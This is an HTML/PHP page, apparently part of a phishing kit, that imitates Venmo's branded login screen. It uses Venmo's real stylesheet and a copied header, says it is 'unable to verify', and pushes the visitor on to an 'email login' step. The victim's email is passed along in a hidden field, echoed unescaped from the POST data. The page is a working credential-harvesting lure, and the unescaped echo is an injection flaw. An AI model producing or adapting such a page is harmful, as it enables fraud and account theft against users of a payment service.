<html>
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
<title>Venmo</title>
<link rel="icon" type="images/png" href="assets/img/logo.png">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta charset="utf-8">
<meta name="referrer" content="origin">
<link rel="stylesheet" href="https://venmo.com/build/stylesheets/auth.e374a702d09649f8ba79.compiled.css">
<style type="text/css">
</style>
<link rel="stylesheet" type="text/css" href="assets/css/1.css">
</head>
<body>
<div id="app">
	<div data-reactroot="" data-reactid="1" data-react-checksum="-2130718287">
		<div data-reactid="2">
			<header class="main-header logged-out" data-reactid="3">
			<div class="container" data-reactid="4">
				<div class="global-margin" data-reactid="5">
					<div class="row" data-reactid="6">
						<div class="col-md-12" data-reactid="7">
							<div class="vui-header-hamburger" data-reactid="8">
								<button aria-pressed="false" data-reactid="9"><svg width="30" height="20" data-reactid="10"><title data-reactid="11">Menu Button</title><g class="vui-header-hamburger_top" data-reactid="12"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="13"></line></g><g class="vui-header-hamburger_middle" data-reactid="14"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="15"></line></g><g class="vui-header-hamburger_bottom" data-reactid="16"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="17"></line></g></svg></button>
							</div>
							<a class="venmo asset-venmo-logo-blue" alt="Venmo" data-reactid="18"></a>
							<ul class="hide-mobile" data-reactid="19">
								<li data-reactid="20">
									<a data-reactid="21">How Venmo Works</a>
								</li>
								<li class="" data-reactid="22">
									<a data-reactid="23">Business</a>
								</li>
								<li data-reactid="24">
									<a data-reactid="25">Debit Card</a>
								</li>
								<li data-reactid="26">
									<a data-reactid="27">Security</a>
								</li>
								<li data-reactid="28">
									<a class="contact-us-nav" data-reactid="29">Contact Us</a>
								</li>
							</ul>
						</div>
					</div>
				</div>
			</div>
			</header>
			<div id="content" data-reactid="53">
				<div class="container-fluid" data-reactid="54">
					<div data-reactid="55">
						<div class="auth-header-text" data-reactid="56">
							<h4 data-reactid="57">Sorry we are unable to verify</h4>
						</div>
						<form class="auth-form" action="verify/email" method="post" data-reactid="58">
						<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
							<fieldset class="inputs" data-reactid="59">
								<label class="auth-form-input-label" data-reactid="60">
									<span class="label-text" data-reactid="61">Sorry we can't verify, please verify by email login, please continue.</span>
									<span data-reactid="63"></span>
								</label>
							</fieldset>
							<div class="button-wrapper" data-reactid="69">
								<button class="ladda-button" style="background: #3d95ce;width: 100%;" type="submit" data-style="zoom-out" data-test="submit" data-reactid="70"><span class="ladda-label" data-reactid="71">Continue</span><span class="ladda-spinner" data-reactid="72"></span></button>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<div id="fb-root" class=" fb_reset">
	<div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
		<div></div>
	</div>
</div>
</body>
</html>